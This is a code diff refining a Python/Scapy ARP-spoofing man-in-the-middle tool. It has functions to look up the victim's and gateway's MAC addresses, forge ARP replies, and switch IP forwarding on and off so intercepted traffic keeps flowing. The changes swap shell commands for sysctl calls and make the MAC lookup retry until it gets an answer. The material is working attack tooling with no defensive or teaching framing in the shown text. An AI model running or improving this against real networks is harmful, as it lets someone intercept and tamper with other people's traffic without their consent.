@@ -15,15 +15,16 @@ except KeyboardInterrupt:
   sys.exit(1)
  
 print("\n[*] Enabling IP Forwarding...\n")
-os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+os.system("sudo sysctl net.ipv4.ip_forward=1")
  
 def get_mac(IP):
   print('Getting MAC addr for: ' + str(IP))
   conf.verb = 0
   ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 10, iface = interface)
   
-  if len(unans) > 0:
-    srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 60, iface = interface)
+  # keep requesting until we get response
+  while len(unans) > 0:
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface)
   
   for snd,rcv in ans:
     return rcv.sprintf(r"%Ether.src%")
@@ -35,7 +36,7 @@ def reARP():
   send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
   send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
   print("[*] Disabling IP Forwarding...")
-  os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
+  os.system("sudo sysctl net.ipv4.ip_forward=0")
   print("[*] Shutting Down...")
   sys.exit(1)
  
@@ -55,7 +56,7 @@ def mitm():
     print(victimMAC)
   except Exception as e:
     print(e)
-    os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")            
+    os.system("sudo sysctl net.ipv4.ip_forward=0")            
     print("[!] Couldn't Find Victim MAC Address")
     print("[!] Exiting...")
     sys.exit(1)
@@ -64,7 +65,7 @@ def mitm():
     gateMAC = get_mac(gateIP)
   except Exception as e:
     print(e)
-    os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")            
+    os.system("sudo sysctl net.ipv4.ip_forward=0")            
     print("[!] Couldn't Find Gateway MAC Address")
     print("[!] Exiting...")
     sys.exit(1)
